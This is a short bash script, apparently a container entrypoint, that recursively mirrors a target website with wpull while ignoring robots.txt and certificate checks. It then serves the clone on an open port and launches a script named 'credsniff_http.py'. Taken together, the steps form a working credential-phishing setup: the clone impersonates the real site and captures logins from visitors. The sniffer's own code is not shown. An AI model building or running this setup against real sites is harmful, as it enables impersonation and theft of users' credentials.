#!/usr/bin/env bash
APP_DIR="/app"

if [[ -z "$WEBSITE" ]]; then
  echo "[-] Make sure you have specified WEBSITE environment variable."
  exit 1
fi

echo "[+] Running clone for $WEBSITE"

OUTPUT_FILE=$(echo $WEBSITE | sed "s~http[s]*://~~g")
IFS='/'; OUTPUT_FILE=($OUTPUT_FILE); unset IFS;

wpull "$WEBSITE" \
 --no-check-certificate \
 --no-robots \
 --user-agent "$USER_AGENT" \
 --wait $WAIT \
 --waitretry $WAITRETRY \
 --recursive \
 --level $LEVEL \
 --tries $TRIES \
 --retry-connrefused \
 --retry-dns-error \
 --timeout $TIMEOUT \
 --output-file "$APP_DIR/$OUTPUT_FILE.log" \
 --warc-file "$APP_DIR/$OUTPUT_FILE.warc"

if [[ ! -z "$SRV_PORT" ]]; then
  cd $OUTPUT_FILE
  echo "[+] Running webserver on port $SRV_PORT."
  php -S 0.0.0.0:$SRV_PORT -t . &
  python $APP_DIR/credsniff_http.py
fi
